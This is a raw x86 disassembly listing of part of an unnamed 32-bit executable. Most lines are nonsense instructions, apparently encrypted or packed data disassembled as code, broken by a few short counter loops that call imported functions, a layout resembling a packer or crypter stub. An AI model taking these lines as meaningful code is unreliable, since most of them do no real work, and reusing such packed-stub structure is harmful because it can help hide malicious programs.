  401882:	div    DWORD PTR [edi-0x9658864]
  401888:	sub    al,BYTE PTR [ebx]
  40188a:	push   esp
  40188b:	(bad)  
  40188c:	stos   BYTE PTR es:[edi],al
  40188d:	mov    al,0x96
  40188f:	fbstp  TBYTE PTR [eax-0x26]
  401892:	xor    al,0x25
  401894:	xchg   esi,eax
  401895:	sbb    BYTE PTR [ebx],bl
  401897:	sbb    eax,0xdf1e224f
  40189c:	xchg   ebx,eax
  40189d:	lods   al,BYTE PTR ds:[esi]
  40189e:	cmp    eax,ebp
  4018a0:	mov    cs,WORD PTR [esp+ebx*4]
  4018a3:	jb     0x4018ad
  4018a5:	ja     0x4018df
  4018a7:	xchg   esi,eax
  4018a8:	ror    ecx,cl
  4018aa:	aad    0x4b
  4018ac:	in     eax,dx
  4018ad:	push   esi
  4018ae:	test   BYTE PTR [ecx+ecx*1+0x3a56735f],dh
  4018b5:	leave  
  4018b6:	xor    ebx,DWORD PTR [ecx+eiz*8]
  4018b9:	aam    0x53
  4018bb:	cmp    esp,DWORD PTR [edi+0x1f077c00]
  4018c1:	and    edi,esp
  4018c3:	mov    bl,0x2d
  4018c5:	cdq    
  4018c6:	and    DWORD PTR [ebx+eiz*8+0x3e],edi
  4018ca:	sbb    BYTE PTR [ebp+0x214daf70],ah
  4018d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018d1:	stc    
  4018d2:	mov    edi,0xa149a659
  4018d7:	(bad)  
  4018d8:	gs push cs
  4018da:	sub    ecx,DWORD PTR [ebx+0x74b50e0a]
  4018e0:	jp     0x4018ba
  4018e2:	jmp    0xac7d62aa
  4018e7:	push   eax
  4018e8:	mov    bp,0xf548
  4018ec:	dec    ebx
  4018ed:	mov    esi,0x990e30bd
  4018f2:	push   cs
  4018f3:	cdq    
  4018f4:	out    0x15,al
  4018f6:	cmp    esp,DWORD PTR [ecx+ecx*8+0x18]
  4018fa:	mov    eax,0x6b57075f
  4018ff:	cmp    al,0xa1
  401901:	push   edi
  401902:	or     DWORD PTR [edx+ecx*2-0x26],ecx
  401906:	fst    DWORD PTR es:[ecx]
  401909:	mov    dl,0xba
  40190b:	mov    gs,ebp
  40190d:	lods   al,BYTE PTR ds:[esi]
  40190e:	and    DWORD PTR [ebx],esi
  401910:	in     al,dx
  401911:	sub    cl,BYTE PTR [ebx]
  401913:	ss clc 
  401915:	shr    DWORD PTR [eax-0xb0adb02],cl
  40191b:	dec    edi
  40191c:	lock mov esp,0x32ceb0f8
  401922:	mov    WORD PTR [ebx-0x45],cs
  401925:	(bad)  
  401929:	push   edi
  40192a:	sub    ch,BYTE PTR [ebp+0x717ac16b]
  401930:	fimul  DWORD PTR [esp+eiz*2+0x72]
  401934:	je     0x401995
  401936:	mov    ebp,0x31b5911a
  40193b:	loope  0x401920
  40193d:	(bad)  [ecx-0x4c56c251]
  401943:	mov    eax,0xda67e2b
  401948:	adc    BYTE PTR [ebp-0x3c4e8bef],dl
  40194e:	in     eax,0x8
  401950:	jae    0x401947
  401952:	das    
  401953:	fldcw  WORD PTR [edx-0x3701a01e]
  401959:	cli    
  40195a:	fisubr WORD PTR [ecx-0x7f8ba65a]
  401960:	daa    
  401961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401962:	cli    
  401963:	cmp    al,0x23
  401965:	leave  
  401966:	dec    ebp
  401967:	idiv   DWORD PTR gs:[eax-0x2efdbc31]
  40196e:	mov    BYTE PTR [eax],ah
  401970:	add    DWORD PTR [ebp+0x1b],eax
  401973:	cmp    esi,DWORD PTR [ebx-0x64]
  401976:	jmp    0xe4d492fb
  40197b:	mov    ecx,0xdd752c64
  401980:	into   
  401981:	push   es
  401982:	add    eax,edi
  401984:	mov    DWORD PTR [ecx],eax
  401986:	sbb    ecx,ecx
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	push   ebp
  4019a4:	push   cs
  4019a5:	jmp    0x78419c9b
  4019aa:	js     0x4019aa
  4019ac:	jle    0x401a26
  4019ae:	js     0x401940
  4019b0:	data16 (bad) 
  4019b2:	stos   DWORD PTR es:[edi],eax
  4019b3:	hlt    
  4019b4:	dec    edx
  4019b5:	aas    
  4019b6:	les    edi,FWORD PTR [edi+0x4a]
  4019b9:	push   edx
  4019ba:	(bad)  
  4019bb:	hlt    
  4019bc:	or     eax,0x5b79dd7d
  4019c1:	sub    DWORD PTR [ebp-0x4f],ecx
  4019c4:	loopne 0x401a40
  4019c6:	inc    ecx
  4019c7:	loope  0x40196c
  4019c9:	jae    0x401973
  4019cb:	pop    edi
  4019cc:	scas   al,BYTE PTR es:[edi]
  4019cd:	div    eax
  4019cf:	push   ecx
  4019d0:	jmp    0xf065dede
  4019d5:	mov    ds:0x1b7eb040,eax
  4019da:	rcr    ch,1
  4019dc:	mov    ebx,0xc8ae2717
  4019e1:	jmp    0x6275:0x197c1604
  4019e8:	dec    ecx
  4019e9:	aas    
  4019ea:	mov    DWORD PTR [esi],edi
  4019ec:	inc    edi
  4019ed:	mov    ds:0x628ff16,eax
  4019f2:	mov    ds,WORD PTR [eax]
  4019f4:	fdiv   QWORD PTR [ebp-0x20a6cb6d]
  4019fa:	pop    eax
  4019fb:	and    DWORD PTR [eax-0x68],eax
  4019fe:	sub    al,0x4f
  401a00:	sub    al,0xab
  401a02:	mov    eax,0x7765b8d5
  401a07:	test   DWORD PTR [edi],esp
  401a09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a0a:	pop    ebp
  401a0b:	out    dx,al
  401a0c:	inc    esi
  401a0d:	pop    ebx
  401a0e:	es cwde 
  401a10:	pop    ecx
  401a11:	fcomp  DWORD PTR [ecx]
  401a13:	sub    eax,0xdd4c61d4
  401a18:	sub    edi,DWORD PTR [ecx]
  401a1a:	inc    edx
  401a1b:	enter  0xdd47,0xce
  401a1f:	xor    esi,edx
  401a21:	push   es
  401a22:	rol    BYTE PTR [ebx],0xce
  401a25:	(bad)  
  401a26:	icebp  
  401a27:	gs loope 0x401a25
  401a2a:	sbb    BYTE PTR [esi],0x77
  401a2d:	loopne 0x4019df
  401a2f:	jo     0x4019dd
  401a31:	call   0x9310640f
  401a36:	rcr    esi,cl
  401a38:	ss and ecx,eax
  401a3b:	jl     0x401a97
  401a3d:	cmp    bh,BYTE PTR [edi-0x2fef2cb]
  401a43:	sub    ebx,DWORD PTR [esi+eiz*4-0x765eef3d]
  401a4a:	mov    ch,0xc5
  401a4c:	sub    BYTE PTR [eax+0x7c],dh
  401a4f:	std    
  401a50:	cwde   
  401a51:	cs dec ebx
  401a53:	sar    ah,cl
  401a55:	pop    ebx
  401a57:	xor    esi,eax
  401a59:	pop    eax
  401a5a:	lea    eax,[ecx]
  401a5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a5d:	sub    edx,DWORD PTR [esi+edx*1-0x1b]
  401a61:	jmp    0x401ad0
  401a63:	dec    eax
  401a64:	test   BYTE PTR [ebx],cl
  401a66:	imul   ecx,DWORD PTR [ebx+eax*2+0x42],0x8e5decb9
  401a6e:	(bad)  
  401a6f:	call   0x275dd48c
  401a74:	and    DWORD PTR [ecx+0x47bfcf25],0x5e36c30d
  401a7e:	js     0x401a2d
  401a80:	scas   eax,DWORD PTR es:[edi]
  401a81:	fimul  WORD PTR [edi+ecx*8-0x75cde461]
  401a88:	mov    al,0xd0
  401a8a:	push   eax
  401a8b:	add    ch,BYTE PTR ds:[ebp+0x35b41482]
  401a92:	inc    edi
  401a93:	pushf  
  401a94:	xchg   ebx,eax
  401a95:	inc    ebx
  401a96:	das    
  401a97:	cmp    eax,0xf11c3f5
  401a9c:	cmc    
  401a9d:	aad    0x69
  401a9f:	test   BYTE PTR [edx],dh
  401aa1:	cmp    al,0x48
  401aa3:	or     bl,BYTE PTR [ecx+esi*2+0x10]
  401aa7:	cmp    eax,0xbab1eaca
  401aac:	shr    BYTE PTR [ecx-0x3a],1
  401aaf:	cmp    BYTE PTR [esi-0x20e1ea38],0x4e
  401ab6:	add    edx,DWORD PTR [esi]
  401ab8:	dec    esp
  401ab9:	mov    edx,DWORD PTR [edi]
  401abb:	div    DWORD PTR [ebp+0x43]
  401abe:	jns    0x401a64
  401ac0:	sub    eax,0x61461593
  401ac5:	jnp    0x401a48
  401ac7:	sub    edi,eax
  401ac9:	inc    ebx
  401aca:	fisub  DWORD PTR [esi]
  401acc:	es inc edx
  401ace:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401acf:	adc    dh,BYTE PTR [ebx]
  401ad1:	mov    ch,0x80
  401ad3:	mov    cl,0xf6
  401ad5:	(bad)  
  401ad6:	retf   0x9cde
  401ad9:	push   esi
  401ada:	inc    esi
  401adb:	pop    edx
  401adc:	ret    0xd85e
  401adf:	xchg   esi,eax
  401ae0:	xchg   edx,eax
  401ae2:	cld    
  401ae3:	(bad)  
  401ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ae5:	pop    ebx
  401ae6:	loopne 0x401b0b
  401ae8:	xchg   edi,eax
  401ae9:	ins    DWORD PTR es:[edi],dx
  401aea:	pop    ds
  401aeb:	jb     0x401acd
  401aed:	mov    dl,0x20
  401aef:	cmp    DWORD PTR [ecx],ebp
  401af1:	int    0x49
  401af3:	mov    eax,DWORD PTR [esi+0x46]
  401af6:	jge    0x401b35
  401af8:	shr    BYTE PTR [esi+0x15],1
  401afb:	ret    0xca83
  401afe:	push   edi
  401aff:	icebp  
  401b00:	dec    edi
  401b01:	sub    eax,0xf866ead3
  401b06:	jmp    0x35c6:0x5c42143b
  401b0d:	xchg   edx,eax
  401b0e:	(bad)  
  401b0f:	loope  0x401aff
  401b11:	and    al,BYTE PTR [edx+eax*2-0x52]
  401b15:	mov    DWORD PTR ds:0xc1098119,edi
  401b1b:	int    0x5f
  401b1d:	push   edi
  401b1e:	mov    ebp,0xf3a7b525
  401b23:	cwde   
  401b24:	es cmp eax,0x99086715
  401b2a:	out    dx,al
  401b2b:	mov    edx,0xf8f691c8
  401b30:	pushf  
  401b31:	addr16 pop ds
  401b33:	cwde   
  401b34:	lea    ebx,[esi]
  401b36:	pop    ss
  401b37:	arpl   WORD PTR [ecx],dx
  401b39:	pop    esi
  401b3a:	or     ch,0xb5
  401b3d:	and    eax,DWORD PTR ds:0x97a33a4d
  401b43:	sbb    esi,DWORD PTR [edx]
  401b45:	int    0x36
  401b47:	adc    BYTE PTR [esi],cl
  401b49:	lea    ebx,[ebx+ebp*1+0xd3c77c5]
  401b50:	stos   DWORD PTR es:[edi],eax
  401b51:	mov    dh,cl
  401b53:	push   0x36
  401b55:	repz sar edi,0xe9
  401b59:	in     ax,dx
  401b5b:	or     eax,0x40801aea
  401b60:	xor    al,ah
  401b62:	add    DWORD PTR [edi],esi
  401b64:	xchg   edi,eax
  401b65:	pusha  
  401b66:	imul   BYTE PTR [eax+0x3]
  401b69:	dec    edx
  401b6a:	stc    
  401b6b:	mov    BYTE PTR ds:0x7ef4a1f2,bh
  401b71:	rol    BYTE PTR [edx],cl
  401b73:	int    0xb7
  401b75:	std    
  401b76:	cwde   
  401b77:	jno    0x401bd8
  401b79:	mov    ch,0xc4
  401b7b:	mov    ecx,0x188cec89
  401b80:	lods   eax,DWORD PTR ds:[esi]
  401b81:	adc    bh,BYTE PTR [esi-0x63d12e52]
  401b87:	out    0x45,eax
  401b89:	icebp  
  401b8a:	pop    esi
  401b8b:	push   cs
  401b8c:	sbb    al,dl
  401b8e:	pop    ds
  401b8f:	scas   al,BYTE PTR es:[edi]
  401b90:	mov    DWORD PTR [edx+0xc],ebp
  401b93:	push   ds
  401b94:	aam    0x7e
  401b96:	or     ch,bl
  401b98:	in     eax,0xa9
  401b9a:	push   ds
  401b9b:	enter  0xff51,0x29
  401b9f:	mov    ah,0x16
  401ba1:	cwde   
  401ba2:	xor    dh,BYTE PTR [eax-0x1f0e674d]
  401ba8:	sub    eax,0x97e92254
  401bad:	aam    0x36
  401baf:	pushf  
  401bb0:	cmp    bh,BYTE PTR [esi-0x5281af26]
  401bb6:	cs pushf 
  401bb8:	xor    eax,0xd19c1abe
  401bbd:	push   0x83cd844f
  401bc2:	sub    edx,esp
  401bc4:	ret    
  401bc5:	mov    ebp,0x2d7bc8de
  401bca:	js     0x401b87
  401bcc:	dec    esp
  401bcd:	xchg   edx,eax
  401bce:	mov    al,ds:0x7c59cc3b
  401bd3:	outs   dx,DWORD PTR ds:[esi]
  401bd4:	not    BYTE PTR [edx+0x16]
  401bd7:	rcr    DWORD PTR [ebx],0x91
  401bda:	out    0xcd,eax
  401bdc:	jle    0x401ba8
  401bde:	adc    BYTE PTR [edi],cl
  401be0:	jo     0x401b8c
  401be2:	dec    ecx
  401be3:	outs   dx,BYTE PTR ds:[esi]
  401be4:	nop
  401be5:	test   al,0x65
  401be7:	fisubr WORD PTR [esi-0x7f]
  401bea:	dec    edx
  401beb:	in     al,dx
  401bec:	dec    ebp
  401bed:	sub    ebx,esp
  401bef:	enter  0x526a,0xae
  401bf3:	cmp    ebp,ecx
  401bf5:	and    eax,0x1dff215b
  401bfa:	jle    0x401bc9
  401bfc:	xor    DWORD PTR [ebp+0x40],0x7db8dc2d
  401c03:	fistp  QWORD PTR [edx+edx*2+0x25]
  401c07:	jo     0x401c13
  401c09:	arpl   WORD PTR [edx-0x31834ac7],cx
  401c0f:	repnz icebp 
  401c11:	push   0x807204e6
  401c16:	sbb    dl,BYTE PTR [ebx+0x2b]
  401c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c1a:	cdq    
  401c1b:	popa   
  401c1c:	mov    edi,0xb0f65649
  401c21:	(bad)  
  401c22:	daa    
  401c23:	pop    ecx
  401c24:	or     bh,0xb3
  401c27:	cmp    al,BYTE PTR ds:0x1f4442f6
  401c2d:	add    cl,0xc7
  401c30:	or     BYTE PTR [ecx+0x2581e045],0x3d
  401c37:	test   al,0x42
  401c39:	add    BYTE PTR [eax],al
  401c3b:	add    BYTE PTR [eax],al
  401c3d:	add    cl,ch
  401c3f:	or     eax,DWORD PTR [eax]
  401c41:	add    BYTE PTR [eax],al
  401c43:	mov    eax,ds:0x42a83d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a83d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a83d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a83d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa2e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a83d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a83d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a83d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a761,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a775
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a769
  401cbe:	and    eax,DWORD PTR ds:0x42a7b9
  401cc4:	mov    ds:0x42a769,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a7f9,0x42a801
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a77d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0xdfba
  401d05:	ds repnz mov ah,0x0
  401d09:	push   es
  401d0a:	js     0x401d84
  401d0c:	(bad)  
  401d0d:	jle    0x401d87
  401d0f:	js     0x401cc2
  401d11:	or     ebx,DWORD PTR [ebx-0x4a]
  401d14:	les    edi,FWORD PTR [ebx-0x5]
  401d17:	pop    ebx
  401d18:	das    
  401d19:	xchg   ebx,eax
  401d1a:	aaa    
  401d1b:	(bad)  
  401d1c:	(bad)  
  401d1e:	lods   eax,DWORD PTR ds:[esi]
  401d1f:	ficomp WORD PTR [edx]
  401d21:	ins    DWORD PTR es:[edi],dx
  401d22:	push   esi
  401d23:	or     bl,bl
  401d25:	and    ecx,eax
  401d27:	pop    ds
  401d28:	ins    BYTE PTR es:[edi],dx
  401d29:	fnstenv [esi+0x28f98bc8]
  401d2f:	call   0x5ce741fb
  401d34:	sub    al,0xc9
  401d36:	jb     0x401d51
  401d38:	arpl   WORD PTR [ecx-0x40],dx
  401d3b:	mov    esi,0x5108baea
  401d40:	test   al,0x24
  401d42:	mul    ecx
  401d44:	push   es
  401d45:	push   edx
  401d46:	push   0xbcb8a406
  401d4b:	shl    DWORD PTR [ebx-0x6cecbf1e],0xa7
  401d52:	cs sahf 
  401d54:	dec    ebx
  401d55:	xchg   ecx,eax
  401d56:	lock jecxz 0x401d11
  401d59:	fist   DWORD PTR [ebp+0x2a]
  401d5c:	add    edx,DWORD PTR [edx]
  401d5e:	sub    al,0x43
  401d60:	sbb    esp,edi
  401d62:	pop    edx
  401d63:	in     eax,dx
  401d64:	aad    0x44
  401d66:	mov    DWORD PTR [ecx],eax
  401d68:	faddp  st(2),st
  401d6a:	or     eax,0xc6978273
  401d6f:	xlat   BYTE PTR ds:[ebx]
  401d70:	ss aas 
  401d72:	dec    eax
  401d73:	add    al,0x3f
  401d75:	xor    DWORD PTR [eax-0x43ba7991],ecx
  401d7b:	mov    fs,WORD PTR [eax-0x38dd58d7]
  401d81:	nop
  401d82:	xor    al,0x51
  401d84:	das    
  401d85:	aad    0x0
  401d87:	and    BYTE PTR [eax],ah
  401d89:	xchg   ah,bl
  401d8b:	not    DWORD PTR [ebp-0x8]
  401d8e:	shl    edi,cl
  401d90:	stc    
  401d91:	jmp    0x401d65
  401d93:	retf   0xc106
  401d96:	shl    ebx,0xcb
  401d99:	add    cl,dh
  401d9b:	mov    ch,0x49
  401d9d:	sahf   
  401d9e:	enter  0x3752,0xa4
  401da2:	test   eax,ebp
  401da4:	xchg   ebp,eax
  401da5:	out    0xff,eax
  401da7:	std    
  401da8:	lahf   
  401da9:	add    eax,0xf963bf09
  401dae:	lahf   
  401daf:	shl    BYTE PTR [edi-0x24],cl
  401db2:	js     0x401e1b
  401db4:	aad    0x15
  401db6:	lock mov DWORD PTR [edx],edi
  401db9:	jp     0x401d7c
  401dbb:	xchg   esp,eax
  401dbc:	sti    
  401dbd:	loope  0x401d74
  401dbf:	sbb    eax,0x5ec3f2a7
  401dc4:	sub    esi,DWORD PTR [ebx+esi*8-0x51b68e06]
  401dcb:	imul   edx,DWORD PTR ss:[edx],0xffffffa6
  401dcf:	mov    al,0x92
  401dd1:	je     0x401db0
  401dd3:	jbe    0x401dce
  401dd5:	(bad)  
  401dd6:	not    DWORD PTR [ebp-0x3435fbc3]
  401ddc:	fwait
  401ddd:	cli    
  401dde:	and    DWORD PTR [edx+ecx*4-0x5],edx
  401de2:	adc    bl,bl
  401de4:	cs jge 0x401e5a
  401de7:	popf   
  401de8:	sti    
  401de9:	loopne 0x401de2
  401deb:	jb     0x401d8c
  401ded:	add    dh,BYTE PTR [edx+0x2c]
  401df0:	xchg   esi,eax
  401df1:	es in  al,dx
  401df3:	xor    ch,dl
  401df5:	sahf   
  401df6:	add    BYTE PTR [ecx+0x1e4504],ah
  401dfc:	out    0xd6,eax
  401dfe:	xchg   ebp,eax
  401dff:	fwait
  401e00:	aaa    
  401e01:	xlat   BYTE PTR ds:[ebx]
  401e02:	pop    es
  401e03:	adc    DWORD PTR [edi+esi*4],edx
  401e06:	push   esp
  401e07:	push   eax
  401e08:	push   0x585ede5
  401e0d:	dec    edx
  401e0e:	mov    ch,0x88
  401e10:	jle    0x401e55
  401e12:	imul   edi,DWORD PTR ds:0x2f53a3cb,0xffffffa6
  401e19:	add    BYTE PTR [edx],cl
  401e1b:	loop   0x401e94
  401e1d:	pop    eax
  401e1e:	pop    edi
  401e1f:	sub    eax,DWORD PTR [esi+0xd94e28d]
  401e25:	enter  0x3a4e,0x93
  401e29:	sub    BYTE PTR [eax],ah
  401e2b:	jbe    0x401dbc
  401e2d:	iret   
  401e2e:	adc    ebp,ebx
  401e30:	dec    edi
  401e31:	sbb    DWORD PTR [eax],0xffffffa1
  401e34:	lods   al,BYTE PTR ds:[esi]
  401e35:	cld    
  401e36:	inc    edi
  401e37:	cmp    al,0xcf
  401e39:	imul   DWORD PTR [eax+ebp*4+0x1e]
  401e3d:	lock sar DWORD PTR [edi],0xe7
  401e41:	mov    ebx,0xef26a69f
  401e46:	mov    edx,0x7f2e992e
  401e4b:	in     al,dx
  401e4c:	rcl    cl,cl
  401e4e:	add    DWORD PTR [eax+0x6f1f07c0],esi
  401e54:	inc    esp
  401e55:	leave  
  401e56:	mov    ch,0xf5
  401e58:	iret   
  401e59:	xchg   ebp,eax
  401e5a:	xchg   ecx,eax
  401e5b:	or     ch,BYTE PTR [edi-0x71dd407a]
  401e61:	xor    cl,BYTE PTR [edi-0x280853b8]
  401e67:	(bad)  
  401e69:	std    
  401e6a:	jo     0x401ee7
  401e6c:	jns    0x401e74
  401e6e:	imul   BYTE PTR [edx+0x51]
  401e71:	push   cs
  401e72:	cmp    BYTE PTR [ecx-0x12],al
  401e75:	rcl    DWORD PTR [eax-0x40f9d79d],cl
  401e7b:	pushf  
  401e7c:	leave  
  401e7d:	xlat   BYTE PTR ds:[ebx]
  401e7e:	outs   dx,BYTE PTR ds:[esi]
  401e7f:	sbb    cl,bh
  401e81:	das    
  401e82:	ss mov eax,0x49a73a03
  401e88:	cmp    eax,DWORD PTR [esi-0xbf9c920]
  401e8e:	fwait
  401e8f:	scas   al,BYTE PTR es:[edi]
  401e90:	jecxz  0x401e31
  401e92:	rcl    edi,1
  401e94:	sub    esp,eax
  401e96:	jne    0x401e9f
  401e98:	xchg   BYTE PTR [edx+0x665295b3],ah
  401e9e:	or     DWORD PTR [ecx+0xe6db307],0xffffffa1
  401ea5:	fld    st(6)
  401ea7:	add    al,0xdb
  401ea9:	popa   
  401eaa:	dec    ecx
  401eab:	xor    eax,0x2daec295
  401eb0:	stos   DWORD PTR es:[edi],eax
  401eb1:	mov    al,0xdc
  401eb3:	imul   ebp,DWORD PTR [ebx-0x51920143],0x94898501
  401ebd:	loopne 0x401e7a
  401ebf:	xchg   esp,eax
  401ec0:	fidiv  DWORD PTR [ebx-0x9]
  401ec3:	test   BYTE PTR [edx+0x8],0x4
  401ec7:	iret   
  401ec8:	dec    ecx
  401ec9:	mov    ebp,0x151311bd
  401ece:	mov    ds:0x93877b5d,al
  401ed3:	repz dec ebx
  401ed5:	cdq    
  401ed6:	jo     0x401e8e
  401ed8:	icebp  
  401ed9:	test   eax,0xf0aff6b4
  401ede:	or     esi,edi
  401ee0:	cmp    BYTE PTR [ecx],cl
  401ee2:	sbb    al,0xe5
  401ee4:	out    0x8f,eax
  401ee6:	cmp    BYTE PTR [edx-0x724fe8ee],al
  401eec:	mov    BYTE PTR [ebx],bh
  401eee:	mov    ss,WORD PTR [ebx+0x61]
  401ef1:	mov    gs,WORD PTR [eax+0x3ea4d1a9]
  401ef7:	xchg   ecx,eax
  401ef8:	add    al,0x49
  401efa:	sbb    BYTE PTR [edi-0x7978abec],al
  401f00:	sub    eax,0xfe4ce778
  401f05:	add    DWORD PTR [eax],eax
  401f07:	mov    al,ds:0x4a85324b
  401f0c:	pop    ecx
  401f0d:	lods   al,BYTE PTR ds:[esi]
  401f0e:	xor    BYTE PTR [bx+di-0x2f],dh
  401f12:	ret    
  401f13:	lods   eax,DWORD PTR ds:[esi]
  401f14:	mov    esi,0x3223bddb
  401f19:	retf   
  401f1a:	lock or BYTE PTR [ecx+0x17],bl
  401f1e:	pop    edi
  401f1f:	cmp    al,0xed
  401f21:	sub    DWORD PTR [ebx],esp
  401f23:	retf   0x4453
  401f26:	xchg   esi,eax
  401f27:	(bad)  
  401f28:	cs sti 
  401f2a:	xor    BYTE PTR [edi+0x4e],al
  401f2d:	jne    0x401ed1
  401f2f:	scas   al,BYTE PTR es:[edi]
  401f30:	stos   WORD PTR es:[edi],ax
  401f32:	mov    al,ds:0xcebe93f2
  401f37:	fst    DWORD PTR [ecx-0x2c7cc39d]
  401f3d:	orps   xmm7,XMMWORD PTR [edx+ebx*4]
  401f41:	jmp    0x401f98
  401f43:	jecxz  0x401ee7
  401f45:	jecxz  0x401ee5
  401f47:	sub    DWORD PTR [ebx-0x4eb156d3],eax
  401f4d:	jbe    0x401f9e
  401f4f:	cmp    eax,ecx
  401f51:	mov    dl,0x50
  401f53:	(bad)  
  401f54:	pop    edi
  401f55:	ds (bad) 
  401f57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f58:	mov    edi,DWORD PTR [ebp-0x65]
  401f5b:	dec    eax
  401f5c:	in     al,dx
  401f5d:	mov    ch,0x18
  401f5f:	lock push cs
  401f61:	xor    BYTE PTR [edx-0x58],bh
  401f64:	cmp    BYTE PTR [eax],ch
  401f66:	dec    esp
  401f67:	and    DWORD PTR [esi-0x3],0x306468df
  401f6e:	jae    0x401fdc
  401f70:	add    edi,ebp
  401f72:	call   0xe944:0xa4882976
  401f79:	adc    DWORD PTR [edi],ecx
  401f7b:	jb     0x401fc7
  401f7d:	xchg   ebp,eax
  401f7e:	out    dx,al
  401f7f:	mov    eax,ds:0x71392abb
  401f84:	shr    DWORD PTR ds:0xe27a2382,0xac
  401f8b:	mov    bl,0x2f
  401f8d:	jns    0x401fc5
  401f8f:	test   ah,dh
  401f91:	cmp    BYTE PTR [ebx],al
  401f93:	or     BYTE PTR [ebx],dh
  401f95:	rol    BYTE PTR [ebx],0x5
  401f98:	cmp    DWORD PTR [eax+0x5230042],ebp
  401f9e:	mov    DWORD PTR [eax+0x39a30042],ebp
  401fa4:	test   al,0x42
  401fa6:	add    BYTE PTR [ecx+0x581e84d],cl
  401fac:	icebp  
  401fad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401fae:	inc    edx
  401faf:	add    BYTE PTR [eax-0x74fffffb],bl
  401fb5:	inc    ebp
  401fb6:	or     BYTE PTR [ecx+0x42a75925],al
  401fbc:	add    BYTE PTR [eax],al
  401fbe:	add    BYTE PTR [eax],al
  401fc0:	add    cl,ch
  401fc2:	or     eax,0x8b000000
  401fc7:	or     eax,0x42a759
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a759,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a759,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a759,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [edi-0x79de74de],ecx
  40201c:	add    al,0x78
  40201e:	js     0x40201e
  402020:	jle    0x40209a
  402022:	js     0x401fc0
  402024:	jmp    0xc6b3:0xa6e4aa48
  40202b:	mov    es,WORD PTR [edi+0x73c722f0]
  402031:	xlat   BYTE PTR ds:[ebx]
  402032:	outs   dx,BYTE PTR ds:[esi]
  402033:	mov    ch,0xf9
  402035:	stos   DWORD PTR es:[edi],eax
  402036:	test   al,0x5d
  402038:	inc    eax
  402039:	and    DWORD PTR [edx],esi
  40203b:	mov    ds:0x9578f78e,eax
  402040:	dec    ecx
  402041:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402042:	fadd   QWORD PTR [edi+0x13414c82]
  402048:	cli    
  402049:	ins    BYTE PTR es:[edi],dx
  40204a:	(bad)  
  40204b:	cmc    
  40204c:	add    dl,bh
  40204e:	jmp    0x127a1cbc
  402053:	loop   0x4020a0
  402055:	fldenv cs:[eax-0x65]
  402059:	out    dx,al
  40205a:	cmp    BYTE PTR [ebp-0xa],dl
  40205d:	repz xor DWORD PTR [esp+edi*4+0x581c7873],0xee66b674
  402069:	pop    ecx
  40206a:	fstp   QWORD PTR [edx]
  40206c:	stc    
  40206d:	xchg   esp,eax
  40206e:	dec    ecx
  40206f:	enter  0x25c6,0xfa
  402073:	push   edx
  402074:	scas   al,BYTE PTR es:[edi]
  402075:	pop    ecx
  402076:	(bad)  
  402077:	in     al,0xa9
  402079:	and    eax,0xcd73f4b8
  40207e:	call   0x638044d7
  402083:	je     0x402097
  402085:	call   0x289f1aa7
  40208a:	cmc    
  40208b:	(bad)  
  40208c:	dec    edi
  40208d:	jl     0x402064
  40208f:	dec    edx
  402090:	test   BYTE PTR [esi-0x3f],dl
  402093:	push   ds
  402094:	inc    eax
  402095:	aad    0x97
  402097:	jns    0x40209b
  402099:	mov    dh,0x5c
